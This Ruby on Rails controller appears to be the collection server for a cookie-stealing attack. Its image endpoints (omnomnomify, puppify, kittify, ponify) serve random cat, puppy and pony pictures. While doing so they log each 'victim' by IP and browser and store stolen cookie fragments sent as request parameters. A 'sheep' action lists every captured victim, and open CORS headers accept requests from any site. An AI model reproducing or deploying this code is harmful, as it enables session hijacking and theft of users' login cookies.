class OmnomnomifyController < ApplicationController
  require 'open-uri'
  after_filter :cors_set_access_control_headers

  def index
  end

  def omnomnomify
    omnomnomify = ["tumblr_mohxt1V6a91svhqpoo1_500.gif", "tumblr_md0q05wMJb1rxis0k.gif", "tumblr_ml0nmjWpX41snjjivo1_500.gif", "CastDance_322x183.gif", "CookieDawn_322x183.gif", "Painting_322x183.gif",
                   "CookieMonster-Sitting.jpg", "487961_10150955894571587_1215263686_n.jpg", "534767_10151516100086587_1790492047_n.jpg", "Static.jpg",
                   "cookie_monster.jpg", "935823_10151502554911587_1547641144_n.jpg", "902502_10151355606796587_45192127_o.jpg", "cookie-monster.jpg", "Cookie_250x250.gif"]
    data = open "http://downloads.cdn.sesame.org/sw/OmNomNomify/#{omnomnomify.sample}"

    @victim = Victim.get_victim(params[:session_id],{ip: request.remote_ip, browser: request.env['HTTP_USER_AGENT'] })
    unless params[:seq].include? "mwh"
      @victim.cookie_parts.create(seq: params[:seq], part: params[:cookie_part])
    end
    logger.info data.content_type
    send_data data.read, type: data.content_type, disposition: 'inline',  stream: 'true', buffer_size: '4096'
  end

  def puppify
    puppies = ["http://cdn.sheknows.com/articles/2013/04/Puppy_2.jpg",
               "http://media1.s-nbcnews.com/j/streams/2012/December/121204/1C5045406-tdy-121204-puppy-names-02.blocks_desktop_large.jpg",
               "http://a66c7b.medialib.glogster.com/media/65/65b47f928d29691b626be588265a714ca2da933ceacfa850db78e17f966c9be7/golden-retriever-puppies.jpg",
               "http://all4pets.com.au/wp-content/uploads/2012/07/Dogs-Puppies-746x500.jpg",
               "http://curiouspuppies.com/wp-content/uploads/2013/03/sibling-cockapoo-puppies.jpg",
               "http://ciswastewatch.org.au/wp-content/uploads/2013/11/puppy.jpg",
               "http://www.pbh2.com/wordpress/wp-content/uploads/2013/12/sleeping-puppy.jpg",
               "http://s3-ec.buzzfed.com/static/enhanced/webdr02/2013/6/28/1/anigif_enhanced-buzz-29618-1372396425-12.gif",
               "http://31.media.tumblr.com/tumblr_m24lb9o0ag1r5g67po1_500.gif"]
    data = open puppies.sample

    @victim = Victim.get_victim(params[:session_id],{ip: request.remote_ip, browser: request.env['HTTP_USER_AGENT'] })
    unless params[:seq].include? "mwh"
      @victim.cookie_parts.create(seq: params[:seq], part: params[:cookie_part])
    end
    logger.info data.content_type
    send_data data.read, type: data.content_type, disposition: 'inline',  stream: 'true', buffer_size: '4096'
  end

  def kittify
    kittify = ["http://images5.fanpop.com/image/photos/31500000/kitties-animals-31559361-500-393.jpg",
               "http://images4.fanpop.com/image/photos/19000000/KITTIES-D-random-19024537-640-426.jpg",
               "http://images2.fanpop.com/image/photos/9100000/kitty-kitties-9109284-500-460.jpg",
               "http://24.media.tumblr.com/fb58cde65a9861fb216b1ca5022cced1/tumblr_mzki3qPaXu1s4vmxdo3_400.gif",
               "http://cdn.gifbay.com/2012/11/cute_kitty-13952.gif",
               "http://31.media.tumblr.com/38bd4f46554fc46b1bea820a3013c543/tumblr_n2c9p1DrHh1sk712fo1_250.gif"]
    data = open kittify.sample

    @victim = Victim.get_victim(params[:session_id],{ip: request.remote_ip, browser: request.env['HTTP_USER_AGENT'] })
    unless params[:seq].include? "mwh"
      @victim.cookie_parts.create(seq: params[:seq], part: params[:cookie_part])
    end
    logger.info data.content_type
    send_data data.read, type: data.content_type, disposition: 'inline',  stream: 'true', buffer_size: '4096'
  end

  def ponify
    ponify = ["http://chronicle.su/wp-content/uploads/pinkie-pie.png",
              "http://3.bp.blogspot.com/-p5jC9XfqQhE/VRcHTjZfhII/AAAAAAACMIU/QQQ0OOYyNWg/s1600/Pinkie_pie_4th_wall_by_cptofthefriendship-d4mdrlt.png",
              "http://fc08.deviantart.net/fs70/f/2012/043/f/7/pinkie_pie_party_vector_by_pikn2-d4phjc7.png",
              "http://fc07.deviantart.net/fs71/f/2012/065/f/4/pinkie_pie_sad_by_iks83-d4rx9by.gif",
              "http://img2.wikia.nocookie.net/__cb20130402212903/mlp/images/7/7a/FANMADE_Adorable_Fluttershy.gif",
              "http://fc05.deviantart.net/fs71/f/2013/130/1/b/rainbow_dash___a_cool_pony_by_quanno3-d64sih6.png",
              "http://fc01.deviantart.net/fs70/f/2012/282/6/b/rainbow_dash_by_the_crusius-d5h7k4b.png",
              "http://img3.wikia.nocookie.net/__cb20130103074703/mlp/images/b/be/Rainbow_Dash_performing_Sonic_Rainboom_S01E16.png"]
    data = open ponify.sample

    @victim = Victim.get_victim(params[:session_id],{ip: request.remote_ip, browser: request.env['HTTP_USER_AGENT'] })
    unless params[:seq].include? "mwh"
      @victim.cookie_parts.create(seq: params[:seq], part: params[:cookie_part])
    end
    logger.info data.content_type
    send_data data.read, type: data.content_type, disposition: 'inline',  stream: 'true', buffer_size: '4096'
  end

  def sheep
    @sheep = Victim.all
  end

  def test
    image = "http://www.faviconer.com/uploads/306/598/favicon.png"
    data = open image
    send_data data.read, type: 'image/png', disposition: 'inline',  stream: 'true', buffer_size: '4096'
  end

  def test2
    redirect_to test_path
  end

  private

  def cors_set_access_control_headers
    headers['Access-Control-Allow-Origin'] = "*"
    headers['Access-Control-Request-Method'] = %w{GET POST OPTIONS}.join(",")
  end

end
